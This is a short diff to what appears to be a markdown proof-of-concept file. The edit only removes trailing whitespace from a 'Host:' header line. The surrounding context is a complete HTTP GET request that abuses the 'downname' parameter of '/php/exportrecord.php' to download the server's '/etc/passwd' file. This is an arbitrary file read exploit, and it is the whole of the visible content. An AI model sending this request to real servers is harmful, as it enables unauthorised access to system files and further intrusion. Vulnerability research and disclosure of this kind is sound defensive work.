@@ -8,7 +8,7 @@
 
 ```http
 GET /php/exportrecord.php?downtype=10&downname=/etc/passwd HTTP/1.1
-Host: 
+Host:
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
 ```
 
